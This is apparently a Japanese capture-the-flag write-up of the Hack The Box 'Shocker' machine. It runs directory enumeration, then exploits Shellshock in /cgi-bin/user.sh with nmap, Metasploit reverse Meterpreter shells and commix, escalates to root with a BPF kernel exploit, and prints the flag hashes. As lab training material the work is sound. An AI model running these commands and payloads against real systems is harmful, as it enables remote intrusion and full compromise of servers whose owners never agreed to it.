|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:09
Completed NSE at 05:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:09
Completed NSE at 05:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.76 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Shocker_01.png" width="25%" height="25%">  
Webに大した情報はないので、列挙していく
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.7.104/FUZZ             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.7.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 343ms]
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 343ms]
.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 369ms]
cgi-bin/                [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 306ms]
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 290ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 294ms]
:: Progress: [4744/4744] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```
`cgi-bin`にはアクセス拒否されているが、配下のスクリプトにアクセス可能なものがあるかもしれないので列挙  
全列挙すると21万件あったので、5万件で中断  
`user.sh`がアクセス可能であった
```sh
└─$  ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.7.104/cgi-bin/FUZZ -e .py,.php,.pl,.sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.7.104/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Extensions       : .py .php .pl .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html.py                [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 313ms]
.html                   [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 313ms]
.html.php               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 314ms]
.html.sh                [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 314ms]
.html.pl                [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 314ms]
user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 312ms]
.htm.php                [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 297ms]
.htm.py                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 298ms]
.htm                    [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 298ms]
.htm.sh                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 297ms]
.htm.pl                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 304ms]
.                       [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 299ms]
.htaccess               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 281ms]
.htaccess.pl            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 303ms]
.htaccess.py            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 310ms]
.htaccess.sh            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 310ms]
.htaccess.php           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 310ms]
.htc.py                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 298ms]
.htc                    [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 299ms]
.htc.php                [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 280ms]
.htc.sh                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 299ms]
.htc.pl                 [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 299ms]
.html_var_DE.py         [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 312ms]
.html_var_DE.pl         [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 313ms]
.html_var_DE.php        [Status: 403, Size: 311, Words: 22, Lines: 12, Duration: 313ms]
.html_var_DE            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 313ms]
.html_var_DE.sh         [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 302ms]
.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 294ms]
.htpasswd.pl            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 294ms]
.htpasswd.sh            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 277ms]
.htpasswd.py            [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 294ms]
.htpasswd.php           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 294ms]
.html..sh               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 288ms]
.html..py               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 288ms]
.html..php              [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 288ms]
.html..pl               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 288ms]
.html.                  [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 288ms]
.html.html              [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 296ms]
.html.html.py           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 279ms]
.html.html.php          [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 284ms]
.html.html.pl           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 294ms]
.html.html.sh           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 293ms]
.htpasswds              [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 301ms]
.htpasswds.py           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 309ms]
.htpasswds.sh           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 309ms]
.htpasswds.php          [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 309ms]
.htpasswds.pl           [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 309ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```


## STEP 3
`user.sh`にアクセスすると、どうやら`uptime`コマンドが実行されるスクリプトが動作しているっぽい
```sh
└─$ curl http://10.129.7.104/cgi-bin/user.sh          
Content-Type: text/plain

Just an uptime test script

 05:51:45 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00


└─$ curl http://10.129.7.104/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 05:51:51 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00
```
cgi-binのスクリプトからコマンド実行されているが、もしかしたら`ShellShock`という脆弱性を用いたRCEができるかも  
nmapでShellShockの存在を確認でき、実際に存在することを確認できた
```sh
└─$ nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.7.104 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 06:04 EDT
Nmap scan report for 10.129.7.104
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```
オプションを追加することで、実際にRCEできる  
が、失敗
```sh
└─$ nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=/usr/bin/id 10.129.7.104
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 06:06 EDT
Nmap scan report for 10.129.7.104
Host is up (0.32s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.129.7.104 Port 80</address>
|   </body></html>
|   
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 4.20 seconds
```
初めに`echo`コマンドを追加すればRCEできた
```sh
└─$ nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh,cmd='echo;/usr/bin/id' 10.129.7.104 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 06:07 EDT
Nmap scan report for 10.129.7.104
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
|   
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
```



# SOLUTION 1
USE METASPLOIT
## STEP 4
ShellShockの脆弱性を利用してリバースシェル取得！ユーザフラグゲット
```sh
msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2     \_ target: Linux x86                             .                .          .      .
   3     \_ target: Linux x86_64                          .                .          .      .
   4   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   5   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   6   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   7   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   8   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   9   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   10  exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   11  exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   12    \_ target: Linux x86                             .                .          .      .
   13    \_ target: Linux x86_64                          .                .          .      .
   14  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   15  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 15, use 15 or use exploit/multi/misc/xdh_x_exec

msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.129.7.104
RHOSTS => 10.129.7.104

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST tun0
LHOST => 10.10.14.70

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 10.10.14.70:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.129.7.104
[*] Meterpreter session 1 opened (10.10.14.70:4444 -> 10.129.7.104:36796) at 2025-04-30 02:37:29 -0400

meterpreter > getuid
Server username: shelly

meterpreter > search -f user.txt
Found 1 result...
=================

Path                   Size (bytes)  Modified (UTC)
----                   ------------  --------------
/home/shelly/user.txt  33            2025-04-30 02:34:30 -0400

meterpreter > cat /home/shelly/user.txt
20e038c019b7e9cc456d1666e4ad268e
```


## STEP 5
`post/multi/recon/local_exploit_suggester`でEoPを捜す
```sh
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.129.7.104 - Collecting local exploits for x86/linux...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.129.7.104 - 204 exploit checks are being tried...
[+] 10.129.7.104 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 10.129.7.104 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 10.129.7.104 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-96-generic is vulnerable
[+] 10.129.7.104 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 10.129.7.104 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.129.7.104 - exploit/linux/local/su_login: The target appears to be vulnerable.
[*] Running check method for exploit 66 / 66
[*] 10.129.7.104 - Valid modules for session 1:
============================

 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                    Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.
 3   exploit/linux/local/docker_cgroup_escape                           Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-96-generic is vulnerable
 4   exploit/linux/local/glibc_realpath_priv_esc                        Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/abrt_raceabrt_priv_esc                         No                       The target is not exploitable.
 8   exploit/linux/local/abrt_sosreport_priv_esc                        No                       The target is not exploitable.
 9   exploit/linux/local/af_packet_chocobo_root_priv_esc                No                       The target is not exploitable. Linux kernel 4.4.0-96-generic #119-Ubuntu is not vulnerable
 10  exploit/linux/local/af_packet_packet_set_ring_priv_esc             No                       The target is not exploitable.
 11  exploit/linux/local/ansible_node_deployer                          No                       The target is not exploitable. Ansible does not seem to be installed, unable to find ansible executable
 12  exploit/linux/local/apport_abrt_chroot_priv_esc                    No                       The target is not exploitable.
 13  exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc         No                       The target is not exploitable.
 14  exploit/linux/local/bpf_priv_esc                                   No                       The target is not exploitable.
 15  exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe      No                       Cannot reliably check exploitability. Unknown target kernel version, recommend manually checking if target kernel is vulnerable.
 16  exploit/linux/local/cve_2021_38648_omigod                          No                       The target is not exploitable. The omiserver process was not found.
 17  exploit/linux/local/cve_2022_0847_dirtypipe                        No                       The target is not exploitable. Linux kernel version 4.4.0 is not vulnerable
 18  exploit/linux/local/cve_2022_1043_io_uring_priv_esc                No                       The target is not exploitable.
 19  exploit/linux/local/desktop_privilege_escalation                   No                       The target is not exploitable.
 20  exploit/linux/local/diamorphine_rootkit_signal_priv_esc            No                       The target is not exploitable. Diamorphine is not installed, or incorrect signal '64'
 21  exploit/linux/local/docker_daemon_privilege_escalation             No                       The target is not exploitable.
 22  exploit/linux/local/docker_privileged_container_escape             No                       The target is not exploitable. Not inside a Docker container
 23  exploit/linux/local/exim4_deliver_message_priv_esc                 No                       The target is not exploitable.
 24  exploit/linux/local/glibc_ld_audit_dso_load_priv_esc               No                       The target is not exploitable.
 25  exploit/linux/local/glibc_origin_expansion_priv_esc                No                       The target is not exploitable. GNU C Library version 2.23 is not vulnerable
 26  exploit/linux/local/glibc_tunables_priv_esc                        No                       The target is not exploitable. The glibc version (2.23-0ubuntu9) found on the target does not appear to be vulnerable
 27  exploit/linux/local/hp_xglance_priv_esc                            No                       The target is not exploitable. /opt/perf/bin/xglance-bin file not found
 28  exploit/linux/local/juju_run_agent_priv_esc                        No                       The target is not exploitable.
 29  exploit/linux/local/ktsuss_suid_priv_esc                           No                       The target is not exploitable. /usr/bin/ktsuss file not found
 30  exploit/linux/local/lastore_daemon_dbus_priv_esc                   No                       The target is not exploitable.
 31  exploit/linux/local/libuser_roothelper_priv_esc                    No                       The target is not exploitable. /usr/sbin/userhelper file not found
 32  exploit/linux/local/nested_namespace_idmap_limit_priv_esc          No                       The target is not exploitable.
 33  exploit/linux/local/netfilter_priv_esc_ipv4                        No                       The target is not exploitable.
 34  exploit/linux/local/network_manager_vpnc_username_priv_esc         No                       The target is not exploitable.
 35  exploit/linux/local/ntfs3g_priv_esc                                No                       The target is not exploitable.
 36  exploit/linux/local/omniresolve_suid_priv_esc                      No                       The target is not exploitable. /opt/omni/lbin/omniresolve file not found
 37  exploit/linux/local/overlayfs_priv_esc                             No                       The target is not exploitable.
 38  exploit/linux/local/progress_flowmon_sudo_privesc_2024             No                       The target is not exploitable.
 39  exploit/linux/local/progress_kemp_loadmaster_sudo_privesc_2024     No                       The target is not exploitable. Found 0 indicators this is a KEMP product
 40  exploit/linux/local/ptrace_sudo_token_priv_esc                     No                       The target is not exploitable.
 41  exploit/linux/local/rds_rds_page_copy_user_priv_esc                No                       The target is not exploitable. Linux kernel version 4.4.0-96-generic is not vulnerable
 42  exploit/linux/local/recvmmsg_priv_esc                              No                       The target is not exploitable.
 43  exploit/linux/local/reptile_rootkit_reptile_cmd_priv_esc           No                       The target is not exploitable.
 44  exploit/linux/local/runc_cwd_priv_esc                              No                       The target is not exploitable. The runc command was not found on this system
 45  exploit/linux/local/saltstack_salt_minion_deployer                 No                       The target is not exploitable. salt-master does not seem to be installed, unable to find salt-master executable
 46  exploit/linux/local/servu_ftp_server_prepareinstallation_priv_esc  No                       The target is not exploitable. /usr/local/Serv-U/Serv-U file not found
 47  exploit/linux/local/sock_sendpage                                  No                       The target is not exploitable.
 48  exploit/linux/local/sophos_wpa_clear_keys                          No                       The target is not exploitable.
 49  exploit/linux/local/sudoedit_bypass_priv_esc                       No                       The check raised an exception.
 50  exploit/linux/local/systemtap_modprobe_options_priv_esc            No                       The target is not exploitable. /usr/bin/staprun file not found
 51  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                No                       The check raised an exception.
 52  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                No                       The target is not exploitable. Error processing Tomcat version (packages) into known format: Malformed version number string packages
 53  exploit/linux/local/ubuntu_enlightenment_mount_priv_esc            No                       The target is not exploitable. An exploitable enlightenment_sys was not found on the system
 54  exploit/linux/local/ubuntu_needrestart_lpe                         No                       The target is not exploitable. needrestart binary not found
 55  exploit/linux/local/vcenter_java_wrapper_vmon_priv_esc             No                       The target is not exploitable. /usr/lib/vmware-vmon/java-wrapper-vmon not found on system
 56  exploit/linux/local/vcenter_sudo_lpe                               No                       The target is not exploitable. Unable to determine vcenter build from output:
 57  exploit/linux/local/vmware_alsa_config                             No                       The target is not exploitable.
 58  exploit/linux/local/vmware_workspace_one_access_certproxy_lpe      No                       The target is not exploitable. Not running as the horizon user.
 59  exploit/linux/local/vmwgfx_fd_priv_esc                             No                       The target is not exploitable. Kernel version 4.4.0-96-generic is not vulnerable
 60  exploit/linux/local/zimbra_postfix_priv_esc                        No                       The target is not exploitable.
 61  exploit/linux/local/zimbra_slapper_priv_esc                        No                       The target is not exploitable.
 62  exploit/linux/local/zpanel_zsudo                                   No                       The target is not exploitable.
 63  exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc         No                       The target is not exploitable. Directory '/opt/sysinfo' does not exist
 64  exploit/multi/local/xorg_x11_suid_server                           No                       The target is not exploitable.
 65  exploit/multi/local/xorg_x11_suid_server_modulepath                No                       The target is not exploitable.
 66  exploit/unix/local/setuid_nmap                                     No                       The target is not exploitable. /usr/bin/nmap file not found
```
`exploit/linux/local/bpf_sign_extension_priv_esc`で権限昇格成功！  
また`exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`と`exploit/linux/local/glibc_realpath_priv_esc`でも権限昇格できた
```sh
msf6 > use exploit/linux/local/bpf_sign_extension_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > options

Module options (exploit/linux/local/bpf_sign_extension_priv_esc):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   COMPILE   Auto             yes       Compile on target (Accepted: Auto, True, False)
   COMPILER  Auto             yes       Compiler to use on target (Accepted: Auto, gcc, clang)
   SESSION                    yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > sessions

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         meterpreter x86/linux  shelly @ 10.129.7.104  10.10.14.70:4444 -> 10.129.7.104:36796 (10.129.7.104)

msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > set SESSION 1
SESSION => 1

msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > set LHOST tun0
LHOST => 10.10.14.70

msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > run
[*] Started reverse TCP handler on 10.10.14.70:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.3Iq5jP2C2' (22328 bytes) ...
[*] Writing '/tmp/.POyIdQeuPe' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3045380 bytes) to 10.129.7.104
[*] Cleaning up /tmp/.POyIdQeuPe and /tmp/.3Iq5jP2C2 ...
[*] Meterpreter session 2 opened (10.10.14.70:4444 -> 10.129.7.104:36800) at 2025-04-30 02:47:06 -0400

meterpreter > getuid
Server username: root

meterpreter > search -f root.txt
Found 1 result...
=================

Path            Size (bytes)  Modified (UTC)
----            ------------  --------------
/root/root.txt  33            2025-04-30 02:34:30 -0400

meterpreter > cat /root/root.txt
1f0314767289e73d6a1fcc13681752a5
```



# SOLUTION 2
NO METASPLOIT
## STEP 4
`commix`を使用して、リバースシェル取得  
が、めっちゃコマンドのエラーがでたり、ttyへのアップグレードできない、など操作性悪いので別の手段（まあこのツールはoscpで使えなさそうだし）
```sh
└─$ commix -u http://10.129.7.104/cgi-bin/user.sh --shellshock
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.0-stable
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2024 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[06:21:38] [info] Testing connection to the target URL. 
[06:21:40] [info] Checking if the target is protected by some kind of WAF/IPS.
[06:21:42] [info] Heuristic (basic) tests shows that target URL might contain a script vulnerable to shellshock. 
Do you want to enable the shellshock module ('--shellshock')? [Y/n] > y
[06:21:44] [info] Performing identification (passive) tests to the target URL.
[06:21:47] [info] Testing the shellshock injection technique.           
[06:21:47] [info] Cookie HTTP Header appears to be injectable via shellshock injection technique.
           |_ () { :; }; echo CVE-2014-6271:Done;
Cookie HTTP Header is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > y
